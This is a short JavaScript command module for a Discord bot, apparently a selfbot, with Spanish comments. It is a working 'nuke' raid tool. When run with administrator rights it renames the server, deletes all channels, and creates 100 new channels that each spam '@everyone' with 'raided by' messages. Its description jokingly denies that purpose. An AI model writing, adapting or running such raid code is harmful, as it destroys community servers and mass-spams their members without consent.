const { setTimeout } = require("timers/promises");

module.exports = {
  name: 'nuke',
  description: 'definitivamente no es para nukear el server',
  async execute(msg, args) { 

    if (!msg.guild) {
      await msg.edit("no estas dentro de un servidor, por lo tanto no se puede raidear");
      await setTimeout(3000);
      await msg.delete();
      return;
    }

    if (!msg.member.permissions.has('ADMINISTRATOR')) {
      await msg.delete();
      return;
    }
    console.log(`[!] - raideando ${msg.guild.name}`)

    let name = args[0]; 
    let cName = args[1];
    
    if (isNaN(name)) {
      name = `raid by ${msg.author.username}`;
    } 
    if(isNaN(cName)) {
      cName = name;
    } 
    // cambiar el nombre del servidor
    await msg.guild.setName(cName).then((updated) => {
      console.log("[+] - nombre del server cambiado")
    });
    // borrar canales
    msg.guild.channels.cache.forEach(async (ch) => {
      await ch.delete();
    });

    // crear canales masivamente
    for (let i = 0; i < 100; i++) {
      await msg.guild.channels.create(`raided by ${msg.author.username}`, {type: "GUILD_TEXT"})
        .then(async (ch) => {
          await ch.send("eazy raid @everyone");
        });
    }
  }
}
